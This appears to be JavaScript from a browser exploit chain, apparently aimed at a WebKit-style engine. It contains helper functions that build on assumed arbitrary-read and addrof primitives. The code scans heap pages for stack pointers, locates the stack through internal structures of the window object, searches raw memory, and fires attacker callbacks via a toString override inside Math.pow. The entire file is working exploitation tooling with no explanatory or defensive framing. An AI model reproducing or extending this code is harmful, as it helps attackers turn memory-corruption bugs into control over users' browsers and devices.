PAGE_SIZE = 16384

function ptrspy(ptr)
{
    var ptr0 = ptr - ptr % PAGE_SIZE;
    var queue = [ptr0];
    var queue2 = [];
    var pointers = {};
    pointers[ptr0-0x200000000] = "initial pointer is "+hex(ptr);
    while(queue.length || queue2.length)
    {
        if(!queue.length)
        {
            queue = queue2;
            queue2 = [];
        }
        var value = queue.pop();
        if(value == 0x200000000)
            continue;
        print(pointers[value-0x200000000]);
        print("reading page at "+hex(value));
        for(var i = 0; i < PAGE_SIZE; i += 8)
        {
            var q = read_ptr_at(value+i);
            if(q >= 0x700000000 && q < 0x800000000)
            {
                print("stack pointer found: "+hex(value+i)+" -> "+hex(q));
                if(q % 0x1000 == 0x5c0 || q % 0x1000 == 0x418)
                {
                    print("kek");
                    print(read_ptr_at(q));
                }
            }
            else if(q >= 0x200000000 && q < 0x300000000)
            {
                var r = q - q % PAGE_SIZE;
                if(!pointers[r-0x200000000])
                {
                    pointers[r-0x200000000] = hex(value+i)+" -> "+hex(q);
                    queue2.push(r);
                }
            }
        }
    }
}

function get_stack()
{
    var ptr0 = addrof(window);
    var ptr1 = read_ptr_at(ptr0-16);
    var ptr2 = read_ptr_at(ptr1+8);
    var ptr3 = read_ptr_at(ptr2+8);
    var stack_low = read_ptr_at(ptr3+24);
    var stack_high = read_ptr_at(ptr3+16);
    return [stack_low, stack_high];
}

function find(start, end, value)
{
    var mem = read_mem_s(start, end-start);
    print(mem.length);
    print(mem.indexOf(value));
}

function splice(value, fn)
{
    var fake = { toString: fn };
    Math.pow(value, fake);
    Math.pow(fake, value);
}
